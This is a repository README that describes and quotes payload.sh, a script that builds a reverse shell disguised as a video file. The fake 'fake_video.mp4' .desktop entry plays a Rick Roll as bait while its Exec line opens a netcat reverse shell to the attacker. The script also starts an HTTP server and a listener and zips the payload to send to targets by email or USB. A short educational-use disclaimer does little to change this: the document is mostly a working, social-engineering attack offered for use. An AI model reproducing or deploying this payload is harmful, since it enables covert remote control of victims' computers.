Credits for this go to Null Byte All I did was turn it into the payload bash script here is their video and blog on it https://www.youtube.com/watch?v=ZlfloTpLGT0 https://null-byte.wonderhowto.com/how-to/pop-reverse-shell-with-video-file-by-exploiting-popular-linux-file-managers-0196078/

The MP4_Reverse_Shell repository is designed to automate the creation and distribution of a reverse shell payload disguised as a video file. When the video file is executed, it establishes a reverse shell connection back to the attacker’s system. The script requires minimal input, only needing the IP address of the listener, and automatically sets up the necessary components such as the payload, HTTP server, and listener.

File Breakdown: payload.sh

Listener IP Input:
read -p "Enter your listener IP address (e.g., 192.168.1.XX) " listener_ip

The attacker is prompted to enter their listener IP address, which is the address where the attacker will listen for the reverse shell connection. This is crucial for the attack to target the correct machine.

IP Address Validation:
if [[ ! "$listener_ip" =~ ^[0-9]+.[0-9]+.[0-9]+.[0-9]+$ ]]; then echo "Invalid IP address format. Exiting..." exit 1 fi

The script checks if the entered IP address is in the correct format. If it’s invalid, the script exits to prevent errors. This step ensures that the attacker provides a valid listener IP.

Installing Dependencies:
apt-get update apt-get install -y python3 wget curl zip netcat

The script installs necessary packages (python3, wget, curl, zip, netcat) if they aren't already installed. These tools are used for downloading the video, creating the payload, serving the video, and setting up the listener.

Preparing the Video File:
curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/local/bin/youtube-dl chmod a+rx /usr/local/bin/youtube-dl youtube-dl --restrict-filenames -f 18 'https://www.youtube.com/watch?v=dQw4w9WgXcQ' mv *.mp4 real_video.mp4

The script downloads a Rick Roll video using youtube-dl and renames it to real_video.mp4. This video is used as bait to deceive the target.

Creating the Fake Payload:
cat <<EOF > fake_video.desktop #!/usr/bin/env xdg-open [Desktop Entry] Encoding=UTF-8 Name=fake_video.mp4 Exec=/usr/bin/wget 'http://$listener_ip/real_video.mp4' -O /tmp/real_video.mp4; /usr/bin/xdg-open /tmp/real_video.mp4; /usr/bin/mkfifo /tmp/f; /bin/nc -e /bin/bash $listener_ip 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 & Terminal=false Type=Application Icon=video-x-generic EOF

This section creates a .desktop file, which appears to be a video file but actually sets up a reverse shell. It downloads the video, opens it, and connects back to the attacker’s system using nc (netcat) for the reverse shell.

Starting the HTTP Server:
python3 -m http.server 80 &

The script starts a simple HTTP server on port 80 to serve the video to the target when they attempt to download it.

Starting the Netcat Listener:
nc -lvnp 1234

The script starts a netcat listener on port 1234, waiting for the reverse shell to connect. Once the payload is executed on the target, this listener provides the attacker with control of the target system.

Packaging Files for Distribution:
zip -r /tmp/videos.zip /tmp/pythonServer/videos/

This command zips the folder containing the video and payload into a single file, making it easy to distribute to the target.

How to Use the payload.sh Script

Clone the Repository:
git clone https://github.com/SleepTheGod/MP4_Reverse_Shell.git

Run the Script:
On your local machine, run the payload.sh script. You’ll be prompted for the listener IP address where you want to receive the reverse shell.

Distribute the Zip File:
The script will create a zip file (videos.zip) containing the payload. Distribute this file to the target (via email, USB, etc.).

Wait for the Reverse Shell:
Once the target executes the fake video file, the reverse shell will connect back to your listener on port 1234.

Important Considerations

Ethical and Legal Use:
This script is intended for educational purposes only. Unauthorized use of this script to access systems is illegal and unethical. Only use it in authorized penetration testing environments or for educational demonstrations.

Network Configuration:
Make sure your listener IP is reachable from the target system. If you're behind a firewall or NAT, consider using port forwarding or services like ngrok to expose your local port.

Conclusion

The payload.sh script simplifies the process of creating and distributing a reverse shell payload disguised as a video. With minimal input, the script automatically sets up the listener, prepares the payload, and serves the video to the target. This makes it easier for an attacker to execute a reverse shell attack without requiring manual intervention. Make sure to use this script responsibly and within legal boundaries.

This breakdown provides a clear understanding of the script’s functionality and how to use it effectively.
